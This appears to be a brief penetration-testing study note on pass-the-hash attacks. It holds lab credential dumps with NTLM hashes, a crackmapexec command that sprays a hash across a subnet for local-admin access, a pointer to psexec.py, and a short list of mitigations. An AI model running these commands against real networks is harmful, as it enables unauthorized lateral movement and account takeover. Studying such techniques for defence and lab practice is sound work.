**Pass the Hash**

<br/>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
Jean Grey:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::   (NOTE: this should be Password3)<br/>
Logan:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
<br/>
<br/>
<br/>
crackmapexec smb &lt;ip&gt; -u &quot;&lt;user name&gt;&quot; -H &lt;hash&gt; --local-auth<br/>
<br/>
crackmapexec smb 192.168.247.0/24 -u &quot;Logan&quot; -H 64f12cddaa88057e06a81b54e73b949b --local-auth<br/>
<br/>
<img height="253" src="image.png" width="900"/><br/>
<br/>
<br/>
<br/>
Note can use hashes with psexec.py<br/>
<br/>

<br/>
MItegations to Pass password/hash<br/>
<br/>
<br/>
limit account reuse<br/>
<br/>
avoid local admin apasswords<br/>
duisable guest and admin account<br/>
<br/>
least privelaged<br/>
<br/>
Stong passwords &gt;14 chars<br/>
<br/>
<br/>
Privelge Access Management (PAM)<br/>
Check out senstive accounts when needed<br/>
